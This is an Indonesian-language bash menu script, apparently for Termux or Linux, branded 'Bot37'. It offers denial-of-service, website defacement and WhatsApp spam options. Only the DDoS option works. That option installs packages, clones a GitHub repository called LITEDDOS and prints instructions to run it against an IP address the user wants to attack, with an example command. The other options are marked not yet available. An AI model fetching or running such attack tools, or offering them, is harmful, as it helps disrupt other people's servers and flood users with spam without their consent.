#!/bin/bash

clear



Black="\e[30m\e[0m"
Red="\e[31m\e[0m"
Green="\e[32m\e[0m"
Yellow="\e[33m\e[0m"
Blue="\e[34m\e[0m"
Magenta="\e[35m\e[0m"
Cyan="\e[36m\e[0m"
White="\e[37m\e[0m"


figlet -w 57 -c -f standard "install pcg" | sed -e 's/$/\x1b[31m/'
echo -e "\e[33m=======================\e[0m"
echo -e "\e[33m[1].sudo=Linux\e[0m"
echo -e "\e[33m[2].apt=Termux\e[0m"
echo -e "\e[33m=======================\e[0m"

read -p "pilih [1/2] : " pia

if [ $pia = 1 ]
then
cd $HOME
sleep 2
fi

if [ $pia = 2 ]
then
cd $HOME
sleep 2
fi

clear

figlet -w 57 -c -f standard "Bot37" | sed -e 's/$/\x1b[31m/'
echo -e "\e[33m==========================================\e[0m"
echo -e "\e[34m[1].Subscribe\e[0m"
echo -e "\e[34m[2].Sawer me\e[0m"
echo -e "\e[34m[3].Lainnya\e[0m"
echo -e "\e[33m==========================================\e[0m"
read -p "pilih==> : " pda

if [ $pda = 1 ]
then
cd $HOME
echo "tinggal ke youtub"
fi

if [ $pda = 2 ]
then
cd $HOME
echo "belum ada"
fi

if [ $pda = 3 ]
then
cd $HOME
echo -e "\e[33mTunggu sebentar\e[0m"
sleep 3
fi

clear

figlet -w 57 -c -f standard "Bot37" | sed -e 's/$/\x1b[31m/'
echo -e "\e[33m==========================================\e[0m"
echo -e "\e[34m[1].Liteddos\e[0m"
echo -e "\e[34m[2].bot deface\e[0m"
echo -e "\e[34m[3].Brutal Spam wa\e[0m"
echo -e "\e[33m==========================================\e[0m"
read -p "pilih==> : " twi

if [ $twi = 1 ]
then
apt update && apt upgrade
apt install python2
apt install git
git clone https://github.com/4L13199/LITEDDOS
cd LITEDDOS
echo -e "\e[34mketik exit\e[0m"
echo -e "\e[34msetelah itu ketik cd LITEDDOS\e[0m"
echo -e "\e[34mlalu ketik python2 LITEDDOS.py\e[0m"
echo -e "\e[34mlalu carai alamat ip yang mau di serang\e[0m"
echo -e "\e[34mcontoh: python2 LITEDDOS.py 0.0.0.0.0 80 1000\e[0m"
fi

if [ $twi = 2 ]
then
echo "belum ada"
fi

if [ $twi = 3 ]
then
echo "belum ada"
fi
